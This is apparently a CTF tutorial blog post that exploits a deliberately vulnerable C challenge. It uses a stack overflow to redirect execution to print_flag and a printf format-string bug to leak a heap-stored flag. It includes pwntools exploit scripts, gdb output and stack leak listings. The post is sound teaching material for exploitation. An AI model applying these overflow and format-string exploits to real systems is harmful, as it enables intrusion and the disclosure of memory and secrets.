---
layout: post
title: Format string - leaking
date: 2021-07-29 23:52
category: pwn-training
author: stdnoerr
tags: [format_string]
summary: A introduction to format strings.
---

Today we are going to learn about format strings. This will be done with a challenge.
The challenge files can be found [here](https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/fmtstr/flagleak)

# Analysis
## Code Analysis
Here's the source code for the challenge.
```c
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>

// gcc flagleak.c -o flagleak -no-pie -fno-stack-protector

__attribute__((constructor))
void ignore_me(){
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
}

void print_flag(){
	char input[0x30];
	int fd = open("flag.txt", O_RDONLY);
	char * addr = malloc(0x30);

	if (fd < 0){
		perror("Error");
		_exit(-1);
	}
	read(fd, addr, 0x30);

	puts("Not that easy. There is a part 2 haha");
	fgets(input, sizeof(input), stdin);

	printf(input);

	_exit(0);
}


int main(int argc, char **argv, char **environ){
	char buf[0x60];

	puts("Time to step up you game.");
	read(0, buf, 0x60 + 8 + 16);
}
```
There are three functions _main_, _ignore\_me_ and _print\_flag_. We will ignore _ignore\_me_ as I have already discussed in [first post]({% post_url 2021-06-12-ret2shellcode %}) what it does. The _main_ prints a line and reads an input in a buffer. But, it reads 0x78 bytes while the buffer can hold only 0x60 bytes. So, we have a buffer overflow. But, this overflow is quite limited to do a complete ROP chain. The _print\_flag_ function opens `flag.txt` and stores its contents in a heap chunk. (heap is just a memory region which is used to store dynamically sized items) Then it prints another line and reads input in a buffer using fgets. There is no overflow here. Then it passes our input to _printf_ function. The way our input is passed to printf gives rise to a format string vulnerability. Then it exits using _exit_ syscall.

## What is printf?
_printf_ (PRINT with Format) is a function in C which is used to print stuff to stdout with specific formatting. It has following signature: -
```c
int printf(const char *format, ...);
```
For example, it you want to print a number along with some text, you can do the following: -
```c
#include <stdio.h>

int main(){
    printf("I'm %d years old\n", 10);
}
```
This prints `I'm 10 years old`. The `\n` is called newline, it ends the current line and moves the cursor on next line. `%d` is a format specifier, it is used to specify that a decimal is to be inserted here. So, `%d` is replaced with `10` or whatever number you put. [Here](https://codeforwin.org/2015/05/list-of-all-format-specifiers-in-c-programming.html) is a list of most commonly used format specifiers. For more info on format specifiers, visit [this page](https://en.wikipedia.org/wiki/Printf_format_string#Format_placeholder_specification).

## What is format string vulnerability?
In this vuln, a user-controlled string is passed as _format_ to formatting functions like printf, fprintf, sprintf etc. Using the formatting language we can leak and overwrite values from/at any arbitrary location (provided some requirements). This way we can execute arbitrary commands.

# Exploitation
## Checksec
Running checksec on the binary yields the following:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
Since NX is enabled, we will do a ret2function attack to jump to _print\_flag_ function. Then we will perform some format string. I will skip the details for ret2function. If you want, you can read [this]({% post_url 2021-06-14-ret2win %}) blog.

## ret2func
The following script makes the program jump to _print\_flag_ function.
```py
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('chall.aresx.team', 1004)
	else:
		p = elf.process()

context.binary = elf = ELF('./flagleak')
libc = elf.libc
start()

### Exploit Goes Here ###
offset = 0x68

p.recvline()

payload = b'A'*offset
payload += p64(elf.sym.print_flag)

p.send(payload)

p.interactive()
p.close()
```
If you get a SEGFAULT by running it then you are facing a 16-byte alignment issue. 64 bit architecture requires RSP to be 16-byte aligned whenever a function is called. To circumvent it, just add a return instruction before the jump.
```py
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('localhost', 1337)
	else:
		p = elf.process()

context.binary = elf = ELF('./flagleak')
libc = elf.libc
start()

### Exploit Goes Here ###
offset = 0x68

r = ROP(elf)
ret = r.find_gadget(['ret'])[0]

p.recvline()

payload = b'A'*offset
payload += p64(ret) 
payload += p64(elf.sym.print_flag)

p.send(payload)

p.interactive()
p.close()
```

## Format string
Now that we have reached _print\_flag_ function, we will try to leak the flag.
It is common practice to give a lot of `%p`s or `%x`s to the format string to leak values from the program's stack. The flag is stored in heap. Let's fire gdb to know the general pattern of the heap chunk's address. I'm using [gdb-gef](https://github.com/hugsy/gef). Put a break point after the malloc. To run gdb after the payload, add the following lines before `p.send(payload)`:
```py
attach(p, '''
b *print_flag+43
continue
''')
input('ATTACHED?')
```
```
Breakpoint 1, 0x0000000000401210 in print_flag ()
$rax   : 0x0000000000e782a0  →  0x0000000000000000
$rbx   : 0x0               
$rcx   : 0x0000000000e782d0  →  0x0000000000000000
$rdx   : 0x41              
$rsp   : 0x00007ffe9b0a53c0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x00007ffe9b0a5400  →  "AAAAAAAA"
$rsi   : 0x30              
$rdi   : 0x0000000000e782a0  →  0x0000000000000000
$rip   : 0x0000000000401210  →  <print_flag+43> mov QWORD PTR [rbp-0x10], rax
$r8    : 0x0000000000e782a0  →  0x0000000000000000
$r9    : 0x00007fe17d9b8be0  →  0x0000000000e782d0  →  0x0000000000000000
$r10   : 0x2b0             
$r11   : 0x40              
$r12   : 0x00000000004010c0  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
0x00007ffe9b0a53c0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
0x00007ffe9b0a53c8│+0x0008: 0x4141414141414141
0x00007ffe9b0a53d0│+0x0010: 0x4141414141414141
0x00007ffe9b0a53d8│+0x0018: 0x4141414141414141
0x00007ffe9b0a53e0│+0x0020: 0x4141414141414141
0x00007ffe9b0a53e8│+0x0028: 0x4141414141414141
0x00007ffe9b0a53f0│+0x0030: 0x4141414141414141
0x00007ffe9b0a53f8│+0x0038: 0x0000000300401016
     0x401203 <print_flag+30>  mov    DWORD PTR [rbp-0x4], eax
     0x401206 <print_flag+33>  mov    edi, 0x30
     0x40120b <print_flag+38>  call   0x401090 <malloc@plt>
 →   0x401210 <print_flag+43>  mov    QWORD PTR [rbp-0x10], rax
     0x401214 <print_flag+47>  cmp    DWORD PTR [rbp-0x4], 0x0
     0x401218 <print_flag+51>  jns    0x401230 <print_flag+75>
     0x40121a <print_flag+53>  lea    rdi, [rip+0xdf0]        # 0x402011
     0x401221 <print_flag+60>  call   0x4010b0 <perror@plt>
     0x401226 <print_flag+65>  mov    edi, 0xffffffff

[#0] Id 1, Name: "flagleak", stopped 0x401210 in print_flag (), reason: BREAKPOINT

[#0] 0x401210 → print_flag()
gef➤ 
```
If you run it multiple times, you will notice that the address returned by malloc (RAX) ends with `2a0`. Now we will try to leak values using `%p`s. Why `%p`? because `%p` will give us the value in hex format, using the architecture's register size. I like to use a python loop like the following to leak values in format string attacks. Here I use direct access method to access any specific offset from the stack. The format is `%(index)$p`.
```py
for i in range(1, 30):
    p.sendline(f'%{i}$p')
    leak = p.recvline(False)
    print(i, leak)
```
In this case I had to do the following because the program exits after the format string.
```py
#!/usr/bin/env python3
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('localhost', 1337)
	else:
		p = elf.process()

context.binary = elf = ELF('./flagleak')
libc = elf.libc

offset = 0x68

r = ROP(elf)
ret = r.find_gadget(['ret'])[0]

for i in range(1, 30):
    start()
    p.recvline()

    payload = b'A'*offset 
    payload += p64(ret) 
    payload += p64(elf.sym.print_flag)

    p.send(payload)

    p.recvline()

    p.sendline(f'%{i}$p')
    leak = p.recvline(False)
    print(i, leak)

    p.close()

p.interactive()
p.close()
```
This gives the following:
```
1 b'0x7f08e8bdca03'
2 b'(nil)'
3 b'0x7f92953a1e8e'
4 b'0x7ffd06207c10'
5 b'(nil)'
6 b'0x4141000a70243625'
7 b'0x4141414141414141'
8 b'0x4141414141414141'
9 b'0x4141414141414141'
10 b'0x4141414141414141'
11 b'0x4141414141414141'
12 b'0xc902a0'
13 b'0x300401016'
14 b'0x4141414141414141'
15 b'0x100000000'
16 b'0x40128a'
17 b'0x7f60150427cf'
18 b'(nil)'
19 b'0x3e905cce8d84e569'
20 b'0x4010c0'
21 b'(nil)'
22 b'(nil)'
23 b'(nil)'
24 b'0x52b22fb20bc0286b'
25 b'0x82675847cbc5609d'
26 b'(nil)'
27 b'(nil)'
28 b'(nil)'
29 b'0x1'
```
If you look closely, the value on position (offset) 12 ends with `2a0`. This is our target. It's the address at which flag is stored. Now to read the contents of this address, we will use `%s`. This will print the flag as a string. But, we need to directly access the 12th offset, so we will use `%12$s`.
And BOOM!. You get the flag.
## Final exploit
Here is the final script
```py
#!/usr/bin/env python3
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('localhost', 1337)
	else:
		p = elf.process()

context.binary = elf = ELF('./flagleak')
libc = elf.libc
start()

### Exploit Goes Here ###

r = ROP(elf)
ret = r.find_gadget(['ret'])[0]

p.recvline()

payload = b'A'*0x68 
payload += p64(ret) 
payload += p64(elf.sym.print_flag)

p.send(payload)

p.sendline('%12$s')

print(p.recvlines(2)[-1].decode())

p.close()
```
If you have any doubts/questions/suggestions, contact me on twitter @stdnoerr or discord stdnoerr#7880.
